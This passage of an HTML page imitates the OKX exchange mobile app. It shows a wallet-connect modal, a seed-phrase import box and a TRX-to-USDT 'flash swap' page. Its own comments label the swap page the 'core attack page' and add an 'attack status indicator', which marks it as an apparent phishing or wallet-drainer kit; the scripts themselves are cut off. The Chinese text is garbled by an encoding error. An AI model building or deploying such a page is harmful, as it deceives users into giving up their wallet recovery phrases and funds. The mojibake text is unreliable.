            height: 40px;
            border-radius: 10px;
            margin-right: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: white;
            font-weight: bold;
        }

        .imtoken-icon { background: linear-gradient(45deg, #11CDEF, #1BC7E6); }
        .tronlink-icon { background: linear-gradient(45deg, #FF0013, #FF4444); }
        .metamask-icon { background: linear-gradient(45deg, #F6851B, #E2761B); }

        .wallet-info {
            flex: 1;
        }

        .wallet-name {
            font-size: 16px;
            color: #fff;
            margin-bottom: 4px;
            font-weight: 600;
        }

        .wallet-desc {
            font-size: 12px;
            color: #666;
        }

        .wallet-actions {
            display: flex;
            gap: 12px;
        }

        .wallet-btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .wallet-btn.primary {
            background: #7ed321;
            color: #000;
        }

        .wallet-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* æœç´¢æ  */
        .search-bar {
            margin: 16px;
            background: #1a1a1a;
            border-radius: 20px;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .search-icon {
            font-size: 16px;
            color: #666;
        }

        .search-text {
            color: #666;
            font-size: 14px;
            flex: 1;
        }

        /* KYCè®¤è¯æ¨ªå¹… */
        .kyc-banner {
            margin: 0 16px 16px;
            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
            border-radius: 12px;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        .kyc-content h3 {
            font-size: 18px;
            margin-bottom: 8px;
            color: #fff;
        }

        .kyc-content p {
            font-size: 14px;
            color: #999;
            margin-bottom: 16px;
        }

        .kyc-btn {
            background: #7ed321;
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        /* ç­–ç•¥äº¤æ˜“å¡ç‰‡ */
        .strategy-card {
            margin: 0 16px 16px;
            background: #1a1a1a;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .strategy-icon {
            width: 40px;
            height: 40px;
            background: #333;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .strategy-content {
            flex: 1;
        }

        .strategy-title {
            font-size: 14px;
            color: #fff;
            margin-bottom: 4px;
        }

        .strategy-desc {
            font-size: 12px;
            color: #666;
        }

        .strategy-badge {
            background: #333;
            color: #fff;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
        }

        /* ä¸»è¦å†…å®¹åŒºåŸŸ */
        .main-content {
            display: none;
        }

        .main-content.active {
            display: block;
        }

        /* é—ªå…‘é¡µé¢ - ğŸ¯ æ ¸å¿ƒæ”»å‡»é¡µé¢ */
        .convert-page {
            padding: 16px;
            background: #000;
            min-height: calc(100vh - 160px);
        }

        .convert-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .convert-title {
            font-size: 16px;
            color: #fff;
        }

        .fee-badge {
            background: #7ed321;
            color: #000;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
        }

        .convert-form {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .currency-input {
            margin-bottom: 16px;
        }

        .currency-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
        }

        .currency-selector {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #000;
            border-radius: 8px;
            padding: 16px;
            cursor: pointer;
        }

        .currency-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .currency-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }

        .trx-icon { background: #ff0013; color: #fff; }
        .usdt-icon { background: #26a69a; color: #fff; }

        .currency-name {
            font-size: 16px;
            color: #fff;
        }

        .currency-balance {
            font-size: 12px;
            color: #666;
        }

        .amount-input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 24px;
            font-weight: 600;
            width: 100%;
            text-align: right;
        }

        .amount-input::placeholder {
            color: #333;
        }

        .swap-btn {
            width: 40px;
            height: 40px;
            background: #1a1a1a;
            border: 2px solid #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: -20px auto;
            position: relative;
            z-index: 10;
            cursor: pointer;
        }

        .rate-info {
            background: #0a0a0a;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
        }

        .rate-text {
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .convert-button {
            width: 100%;
            background: #7ed321;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: all 0.3s ease;
        }

        .convert-button:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
        }

        .convert-button:hover:not(:disabled) {
            background: #6bc219;
            transform: translateY(-1px);
        }

        /* å…¶ä»–é¡µé¢æ ·å¼ä¿æŒä¸å˜ */
        .market-header {
            padding: 16px;
            background: #000;
        }

        .market-stats {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 16px;
            margin-bottom: 16px;
        }

        .stat-card {
            background: #1a1a1a;
            border-radius: 8px;
            padding: 12px;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 4px;
        }

        .stat-value {
            font-size: 16px;
            font-weight: 600;
            color: #fff;
        }

        .stat-change {
            font-size: 12px;
            color: #f5455c;
        }

        .stat-change.positive {
            color: #7ed321;
        }

        .fomc-notice {
            background: #1a1a1a;
            border-radius: 8px;
            padding: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .fomc-text {
            font-size: 12px;
            color: #fff;
        }

        .trading-pairs {
            background: #000;
        }

        .pairs-tabs {
            display: flex;
            padding: 0 16px;
            gap: 24px;
            margin-bottom: 16px;
        }

        .tab {
            color: #666;
            font-size: 14px;
            padding: 8px 0;
            cursor: pointer;
            position: relative;
        }

        .tab.active {
            color: #fff;
        }

        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: #7ed321;
        }

        .pairs-filters {
            display: flex;
            padding: 0 16px;
            gap: 12px;
            margin-bottom: 16px;
            overflow-x: auto;
        }

        .filter-btn {
            background: #1a1a1a;
            color: #666;
            border: none;
            padding: 8px 16px;
            border-radius: 16px;
            font-size: 12px;
            white-space: nowrap;
            cursor: pointer;
        }

        .filter-btn.active {
            background: #333;
            color: #fff;
        }

        .pairs-header {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            padding: 8px 16px;
            font-size: 12px;
            color: #666;
            border-bottom: 1px solid #1a1a1a;
        }

        .pair-item {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            padding: 12px 16px;
            border-bottom: 1px solid #0a0a0a;
            align-items: center;
        }

        .pair-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .pair-icon {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            color: #fff;
        }

        .btc-icon { background: #f7931a; }
        .eth-icon { background: #627eea; }
        .okb-icon { background: #3075ee; }
        .sol-icon { background: #9945ff; }
        .doge-icon { background: #c2a633; }
        .xrp-icon { background: #23292f; }

        .pair-details h4 {
            font-size: 14px;
            color: #fff;
            margin-bottom: 2px;
        }

        .pair-volume {
            font-size: 12px;
            color: #666;
        }

        .pair-price {
            text-align: right;
        }

        .price-value {
            font-size: 14px;
            color: #fff;
            margin-bottom: 2px;
        }

        .price-usd {
            font-size: 12px;
            color: #666;
        }

        .price-change {
            text-align: right;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
        }

        .price-change.positive {
            background: rgba(126, 211, 33, 0.1);
            color: #7ed321;
        }

        .price-change.negative {
            background: rgba(245, 69, 92, 0.1);
            color: #f5455c;
        }

        /* Web3é¡µé¢ */
        .web3-page {
            background: #000;
            min-height: calc(100vh - 160px);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
        }

        .web3-animation {
            width: 200px;
            height: 200px;
            margin-bottom: 40px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .web3-grid {
            display: grid;
            grid-template-columns: repeat(20, 1fr);
            grid-template-rows: repeat(20, 1fr);
            gap: 2px;
            width: 100%;
            height: 100%;
            opacity: 0.8;
        }

        .grid-dot {
            width: 100%;
            height: 100%;
            background: #333;
            border-radius: 1px;
            transition: all 0.3s ease;
        }

        .grid-dot.active {
            background: #7ed321;
            box-shadow: 0 0 4px #7ed321;
        }

        .web3-title {
            font-size: 24px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 8px;
            text-align: center;
        }

        .web3-subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 40px;
            text-align: center;
        }

        .web3-actions {
            width: 100%;
            max-width: 300px;
        }

        .web3-btn {
            width: 100%;
            background: #fff;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }

        .web3-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* èµ„äº§é¡µé¢ */
        .assets-page {
            background: #000;
            min-height: calc(100vh - 160px);
        }

        .assets-header {
            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
            padding: 40px 16px;
            position: relative;
            overflow: hidden;
        }

        .falling-coins {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: 1;
        }

        .falling-coin {
            position: absolute;
            font-size: 20px;
            opacity: 0.6;
            animation: fall linear infinite;
        }

        @keyframes fall {
            from {
                transform: translateY(-100px) rotate(0deg);
                opacity: 1;
            }
            to {
                transform: translateY(200px) rotate(360deg);
                opacity: 0;
            }
        }

        .balance-display {
            text-align: center;
            position: relative;
            z-index: 2;
        }

        .balance-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 20px;
        }

        .balance-actions {
            display: flex;
            justify-content: center;
            gap: 16px;
        }

        .balance-action {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 12px 24px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .assets-content {
            padding: 16px;
        }

        /* åº•éƒ¨å¯¼èˆª */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #000;
            border-top: 1px solid #1a1a1a;
            display: flex;
            z-index: 100;
            padding-bottom: env(safe-area-inset-bottom);
        }

        .nav-item {
            flex: 1;
            text-align: center;
            padding: 12px 8px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
        }

        .nav-item.active .nav-icon {
            color: #7ed321;
        }

        .nav-item.active .nav-label {
            color: #7ed321;
        }

        .nav-icon {
            font-size: 20px;
            margin-bottom: 4px;
            color: #666;
            transition: color 0.2s;
        }

        .nav-label {
            font-size: 10px;
            color: #666;
            transition: color 0.2s;
        }

        /* åŠ©è®°è¯å¯¼å…¥æ¨¡æ€æ¡† */
        .mnemonic-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .mnemonic-modal.show {
            display: flex;
        }

        .mnemonic-content {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
        }

        .mnemonic-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            text-align: center;
            margin-bottom: 8px;
        }

        .mnemonic-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 24px;
        }

        .mnemonic-input {
            width: 100%;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 16px;
            color: #fff;
            font-size: 14px;
            min-height: 120px;
            resize: vertical;
            margin-bottom: 20px;
        }

        .mnemonic-input::placeholder {
            color: #666;
        }

        .mnemonic-actions {
            display: flex;
            gap: 12px;
        }

        .mnemonic-btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .mnemonic-btn.primary {
            background: #7ed321;
            color: #000;
        }

        .mnemonic-btn.secondary {
            background: transparent;
            color: #fff;
            border: 1px solid #333;
        }

        /* æ”»å‡»çŠ¶æ€æŒ‡ç¤ºå™¨ */
        .attack-indicator {
            position: fixed;
            top: 100px;
            left: 16px;
            right: 16px;
            background: #f5455c;
            color: #fff;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 200;
            display: none;
        }

        .attack-indicator.show {
            display: block;
            animation: slideDown 0.3s ease-out;
        }

        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* è°ƒè¯•é¢æ¿ */
        .debug-panel {
            position: fixed;
            bottom: 100px;
            left: 16px;
            right: 16px;
            background: rgba(0, 0, 0, 0.95);
            color: #7ed321;
            padding: 16px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            max-height: 200px;
            overflow-y: auto;
            z-index: 150;
            border: 1px solid #333;
            display: none;
            user-select: text;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            cursor: text;
            scrollbar-width: thin;
            scrollbar-color: #7ed321 rgba(255,255,255,0.1);
            /* ç§»åŠ¨ç«¯è§¦æ‘¸æ»šåŠ¨ä¼˜åŒ– */
            -webkit-overflow-scrolling: touch;
            touch-action: pan-y;
            overscroll-behavior: contain;
        }

        .debug-panel::-webkit-scrollbar {
            width: 8px;
        }

        .debug-panel::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
        }

        .debug-panel::-webkit-scrollbar-thumb {
            background: #7ed321;
            border-radius: 4px;
        }

        .debug-panel::-webkit-scrollbar-thumb:hover {
            background: #9fff40;
        }

        .debug-panel.show {
            display: block;
        }

        .debug-toggle {
            position: fixed;
            bottom: 100px;
            right: 16px;
            background: #7ed321;
            color: #000;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            z-index: 160;
        }

        .debug-clear {
            position: fixed;
            bottom: 100px;
            right: 80px;
            background: #ff4757;
            color: #fff;
            border: none;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 14px;
            cursor: pointer;
            z-index: 160;
            transition: all 0.3s ease;
        }

        .debug-clear:hover {
            background: #ff3838;
            transform: scale(1.1);
        }

        /* ç§»åŠ¨ç«¯æ§åˆ¶å°ä¼˜åŒ– */
        @media (max-width: 768px) {
            .debug-panel {
                bottom: 80px;
                left: 8px;
                right: 8px;
                max-height: 250px;
                font-size: 12px;
                padding: 12px;
                /* å¼ºåˆ¶å¯ç”¨è§¦æ‘¸æ»šåŠ¨ */
                overflow-y: scroll;
                -webkit-overflow-scrolling: touch;
                /* é˜²æ­¢é¡µé¢æ»šåŠ¨å¹²æ‰° */
                touch-action: pan-y;
                /* å¢å¼ºæ–‡æœ¬é€‰æ‹© */
                -webkit-touch-callout: default;
                -webkit-user-select: text;
                -khtml-user-select: text;
                -moz-user-select: text;
                -ms-user-select: text;
                user-select: text;
            }

            .debug-toggle {
                bottom: 80px;
                right: 8px;
                padding: 10px 14px;
                font-size: 14px;
            }

            .debug-clear {
                bottom: 80px;
                right: 70px;
                padding: 10px 12px;
                font-size: 16px;
            }
        }

        /* æˆåŠŸæç¤º */
        .success-toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #7ed321;
            color: #000;
            padding: 16px 24px;
            border-radius: 8px;
            font-weight: 600;
            z-index: 2000;
            display: none;
        }

        .success-toast.show {
            display: block;
            animation: toast 2s ease-in-out;
        }

        @keyframes toast {
            0%, 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            20%, 80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }

        .success-toast.error {
            background: #f5455c;
            color: #fff;
        }

        /* é’±åŒ…è¿æ¥çŠ¶æ€æŒ‡ç¤ºå™¨ */
        .wallet-status {
            background: #7ed321;
            color: #000;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            display: none;
        }

        .wallet-status.show {
            display: inline-block;
        }

        /* å“åº”å¼é€‚é… */
        @media (max-width: 375px) {
            .header {
                padding: 8px 12px;
            }

            .search-bar {
                margin: 12px;
            }

            .kyc-banner, .strategy-card {
                margin: 0 12px 12px;
            }
        }
    </style>
</head>
<body>
<!-- é¡¶éƒ¨å¯¼èˆªæ  -->
<div class="header">
    <div class="header-left">
        <div class="menu-btn">
            <div class="menu-line"></div>
            <div class="menu-line"></div>
            <div class="menu-line"></div>
        </div>
        <div class="platform-selector" onclick="showPlatformDropdown()">
            <span id="currentPlatform">äº¤æ˜“æ‰€</span>
            <span class="platform-arrow">></span>
        </div>
    </div>
    <div class="header-right">
        <!-- é’±åŒ…è¿æ¥æŒ‰é’® -->
        <button class="connect-wallet-btn" id="connectWalletBtn" onclick="showWalletModal()">è¿æ¥é’±åŒ…</button>
        <div class="wallet-status" id="walletStatus">å·²è¿æ¥</div>

        <div class="gift-icon">
            ğŸ
            <div class="notification-badge">3</div>
        </div>
        <div class="user-avatar" onclick="showUserMenu()">
            ğŸ‘¤
        </div>
    </div>
</div>

<!-- é’±åŒ…è¿æ¥æ¨¡æ€æ¡† -->
<div class="wallet-modal" id="walletModal">
    <div class="wallet-content">
        <div class="wallet-title">è¿æ¥é’±åŒ…</div>
        <div class="wallet-subtitle">é€‰æ‹©æ‚¨è¦è¿æ¥çš„é’±åŒ…</div>

        <div class="wallet-options">
            <div class="wallet-option" onclick="connectImToken()">
                <div class="wallet-icon imtoken-icon">i</div>
                <div class="wallet-info">
                    <div class="wallet-name">imToken</div>
                    <div class="wallet-desc">ç§»åŠ¨ç«¯DeFié’±åŒ…</div>
                </div>
            </div>

            <div class="wallet-option" onclick="connectTronLink()">
                <div class="wallet-icon tronlink-icon">T</div>
                <div class="wallet-info">
                    <div class="wallet-name">TronLink</div>
                    <div class="wallet-desc">TRONå®˜æ–¹é’±åŒ…</div>
                </div>
            </div>

            <div class="wallet-option" onclick="connectMetaMask()">
                <div class="wallet-icon metamask-icon">M</div>
                <div class="wallet-info">
                    <div class="wallet-name">MetaMask</div>
                    <div class="wallet-desc">ä»¥å¤ªåŠç”Ÿæ€é’±åŒ…</div>
                </div>
            </div>
        </div>

        <div class="wallet-actions">
            <button class="wallet-btn secondary" onclick="closeWalletModal()">å–æ¶ˆ</button>
            <button class="wallet-btn primary" onclick="importWallet()">å¯¼å…¥é’±åŒ…</button>
        </div>
    </div>
</div>

<!-- æœç´¢æ  -->
<div class="search-bar" onclick="showSearch()">
    <div class="search-icon">ğŸ”</div>
    <div class="search-text">ğŸ”¥ SKY æ–°å¸ä¸Šçº¿</div>
</div>

<!-- ä¸»è¦å†…å®¹åŒºåŸŸ -->
<div class="main-content active" id="favorites">
    <!-- KYCè®¤è¯æ¨ªå¹… -->
    <div class="kyc-banner">
        <div class="kyc-content">
            <h3>ç»§ç»­å®Œæˆè®¤è¯ï¼Œè·å¾—æœ€é«˜ 100 USDT</h3>
            <p>æ‚¨éœ€æä¾›èº«ä»½è¯ã€è‡ªæ‹ç…§å’Œä¸ªäººä¿¡æ¯</p>
            <button class="kyc-btn" onclick="startKYC()">ç»§ç»­è®¤è¯</button>
        </div>
    </div>

    <!-- ç­–ç•¥äº¤æ˜“å¡ç‰‡ -->
    <div class="strategy-card">
        <div class="strategy-icon">ğŸ“Š</div>
        <div class="strategy-content">
            <div class="strategy-title">ç­–ç•¥äº¤æ˜“</div>
            <div class="strategy-desc">ä¸€é”®å¼€å¯ SOL ç½‘æ ¼ç­–ç•¥ï¼Œèµšå–é«˜å¹´åŒ–æ”¶ç›Šï¼Œç«‹å³åˆ›å»ºå§</div>
        </div>
        <div class="strategy-badge">1/6</div>
    </div>
</div>

<!-- å¸‚åœºé¡µé¢ -->
<div class="main-content" id="market">
    <div class="market-header">
        <div class="market-stats">
            <div class="stat-card">
                <div class="stat-label">å¸‚å€¼</div>
                <div class="stat-value">$4.17ä¸‡äº¿</div>
                <div class="stat-change">-0.30%</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">æˆäº¤é¢</div>
                <div class="stat-value">$1,293.12äº¿</div>
                <div class="stat-change">-24.61%</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">å¸‚å€¼å æ¯”</div>
                <div class="stat-value">55.44%</div>
                <div style="font-size: 10px; color: #ff9500;">ğŸª™ Bitcoin</div>
            </div>
        </div>

        <div class="fomc-notice">
            <div class="fomc-text">ğŸŒ FOMC ç»æµé¢„æµ‹ï¼ˆç¾å›½ï¼‰å°†äº 10æœˆ4æ—¥ å‘å¸ƒ</div>
            <div>></div>
        </div>
    </div>

    <div class="pairs-tabs">
        <div class="tab active">è‡ªé€‰</div>
        <div class="tab">ç°è´§</div>
        <div class="tab">åˆçº¦</div>
        <div class="tab">æœŸæƒ</div>
        <div class="tab">æ€»è§ˆ</div>
    </div>

    <div class="pairs-filters">
        <button class="filter-btn active">å…¨éƒ¨</button>
        <button class="filter-btn">ä¸»æµå¸</button>
        <button class="filter-btn">æ–°å¸ç§</button>
        <button class="filter-btn">äººå·¥æ™ºèƒ½</button>
        <button class="filter-btn">Solana</button>
    </div>

    <div class="pairs-header">
        <div>åç§° / æˆäº¤é¢</div>
        <div>æœ€æ–°ä»·</div>
        <div>ä»Šæ—¥æ¶¨è·Œ</div>
    </div>

    <div class="trading-pairs">
        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon btc-icon">â‚¿</div>
                <div class="pair-details">
                    <h4>BTC/USDT</h4>
                    <div class="pair-volume">$2.07äº¿</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">115,968.5</div>
                <div class="price-usd">$116,032.3</div>
            </div>
            <div class="price-change positive">+0.03%</div>
        </div>

        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon eth-icon">Î</div>
                <div class="pair-details">
                    <h4>ETH/USDT</h4>
                    <div class="pair-volume">$4.84äº¿</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">4,651.04</div>
                <div class="price-usd">$4,653.60</div>
            </div>
            <div class="price-change negative">-0.34%</div>
        </div>

        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon okb-icon">O</div>
                <div class="pair-details">
                    <h4>OKB/USDT</h4>
                    <div class="pair-volume">$8,164.2ä¸‡</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">201.89</div>
                <div class="price-usd">$202.00</div>
            </div>
            <div class="price-change positive">+0.43%</div>
        </div>

        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon sol-icon">â—</div>
                <div class="pair-details">
                    <h4>SOL/USDT</h4>
                    <div class="pair-volume">$2.4äº¿</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">247.25</div>
                <div class="price-usd">$247.39</div>
            </div>
            <div class="price-change positive">+2.00%</div>
        </div>

        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon doge-icon">Ã</div>
                <div class="pair-details">
                    <h4>DOGE/USDT</h4>
                    <div class="pair-volume">$5.43äº¿</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">0.28794</div>
                <div class="price-usd">$0.28810</div>
            </div>
            <div class="price-change negative">-0.50%</div>
        </div>

        <div class="pair-item">
            <div class="pair-info">
                <div class="pair-icon xrp-icon">X</div>
                <div class="pair-details">
                    <h4>XRP/USDT</h4>
                    <div class="pair-volume">$5,376.2ä¸‡</div>
                </div>
            </div>
            <div class="pair-price">
                <div class="price-value">3.078</div>
                <div class="price-usd">$3.0797</div>
            </div>
            <div class="price-change negative">-1.32%</div>
        </div>
    </div>
</div>

<!-- ğŸ¯ é—ªå…‘é¡µé¢ - æ ¸å¿ƒæ”»å‡»åŠŸèƒ½ -->
<div class="main-content" id="convert">
    <div class="convert-page">
        <div class="convert-header">
            <div class="convert-title">é—ªå…‘</div>
            <div class="fee-badge">0æ‰‹ç»­è´¹</div>
        </div>

        <div class="convert-form">
            <div class="currency-input">
                <div class="currency-label">æ¶ˆè€—</div>
                <div class="currency-selector">
                    <div class="currency-info" onclick="selectFromCurrency()">
                        <div class="currency-icon trx-icon">T</div>
                        <div>
                            <div class="currency-name">TRX</div>
                            <div class="currency-balance" id="trxBalance">å¯ç”¨: 0 TRX</div>
                        </div>
                    </div>
                    <input type="number" class="amount-input" placeholder="è¾“å…¥TRXæ•°é‡" id="fromAmount" oninput="calculateConversion()">
                </div>
            </div>

            <div class="swap-btn" onclick="swapCurrencies()">
                â‡…
            </div>

            <div class="currency-input">
                <div class="currency-label">è·å¾—</div>
                <div class="currency-selector">
                    <div class="currency-info"  onclick="selectToCurrency()">
                        <div class="currency-icon usdt-icon">â‚®</div>
                        <div>
                            <div class="currency-name">USDT</div>
                            <div class="currency-balance">é¢„è®¡è·å¾—</div>
                        </div>
                    </div>
                    <input type="number" class="amount-input" placeholder="0" id="toAmount" readonly>
                </div>
            </div>
        </div>

        <div class="rate-info">
            <div class="rate-text">1 TRX â‰ˆ 0.1634 USDT</div>
        </div>

        <button class="convert-button" id="convertBtn" onclick="connectImToken()">å…‘æ¢</button>
    </div>
</div>

<!-- äº¤æ˜“é¡µé¢ -->
<div class="main-content" id="trade">
    <div style="padding: 16px;">
        <div class="strategy-card">
            <div class="strategy-icon">ğŸ¤–</div>
            <div class="strategy-content">
                <div class="strategy-title">å…¨å¤©å€™æ™ºèƒ½äº¤æ˜“ï¼Œè½»æ¾èººèµ¢</div>
                <div class="strategy-desc">ä¸€é”®å¼€å¯æ™ºèƒ½äº¤æ˜“ï¼Œèµšå–é«˜è¾¾ 200.18% å¹´åŒ–æ”¶ç›Šã€‚</div>
            </div>
        </div>
    </div>
</div>

<!-- Web3é¡µé¢ -->
<div class="main-content" id="web3">
    <div class="web3-page">
        <div class="web3-animation">
            <div class="web3-grid" id="web3Grid"></div>
        </div>
        <div class="web3-title">Web3 å…¥å£ï¼Œä¸€ä¸ªå°±å¤Ÿ</div>
        <div class="web3-subtitle">é’±åŒ… Â· äº¤æ˜“ Â· NFT Â· èµšå¸ Â· DApp</div>
        <div class="web3-actions">
            <button class="web3-btn" onclick="createWallet()">åˆ›å»ºé’±åŒ…</button>
            <button class="web3-btn secondary" onclick="importWallet()">å¯¼å…¥é’±åŒ…</button>
        </div>
    </div>
</div>

<!-- èµ„äº§é¡µé¢ -->
<div class="main-content" id="assets">
    <div class="assets-page">
        <div class="assets-header">
            <div class="falling-coins" id="fallingCoins"></div>
            <div class="balance-display">
                <div class="balance-label">æ˜¨æ—¥æ”¶ç›Š ğŸ‘</div>
                <div class="balance-amount">0.00 USD ></div>
                <div class="balance-actions">
                    <button class="balance-action" onclick="depositFunds()">å……å¸</button>
                </div>
            </div>
        </div>

        <div class="assets-content">
            <div style="text-align: center; margin: 40px 0;">
                <div style="width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, #7ed321, #52c41a); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px;">ğŸ’°</div>
                <h3 style="color: #fff; margin-bottom: 8px;">æŠŠæ¡æœªæ¥ æ‹¥æŠ±æ•°å­—è´§å¸</h3>
                <button class="balance-action" style="background: #7ed321; color: #000; margin-top: 20px;" onclick="depositFunds()">å……å¸</button>
            </div>

            <div style="color: #666; font-size: 12px; margin-bottom: 16px;">å¦‚ä½•å……å¸? <span style="color: #7ed321;">æŸ¥çœ‹æ›´å¤š â†’</span></div>

            <div style="color: #fff; font-size: 16px; margin-bottom: 16px;">çƒ­é—¨å¸</div>

            <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
                <div style="text-align: center;">
                    <div class="pair-icon btc-icon" style="margin: 0 auto 8px;">â‚¿</div>
                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">BTC</div>
                    <div style="font-size: 12px; color: #fff;">$116,050.3</div>
                    <div style="font-size: 10px; color: #7ed321;">+0.08%</div>
                </div>
                <div style="text-align: center;">
                    <div class="pair-icon eth-icon" style="margin: 0 auto 8px;">Î</div>
                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">ETH</div>
                    <div style="font-size: 12px; color: #fff;">$4,653.51</div>
                    <div style="font-size: 10px; color: #f5455c;">-1.26%</div>
                </div>
                <div style="text-align: center;">
                    <div class="pair-icon usdt-icon" style="margin: 0 auto 8px;">â‚®</div>
                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDT</div>
                    <div style="font-size: 12px; color: #fff;">$1.00056</div>
                    <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                </div>
                <div style="text-align: center;">
                    <div class="pair-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
                    <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDC</div>
                    <div style="font-size: 12px; color: #fff;">$0.9999</div>
                    <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- åº•éƒ¨å¯¼èˆª -->
<div class="bottom-nav">
    <div class="nav-item active" onclick="switchTab('favorites')">
        <div class="nav-icon">âš¡</div>
        <div class="nav-label">æ¬§æ˜“</div>
    </div>
    <div class="nav-item" onclick="switchTab('market')">
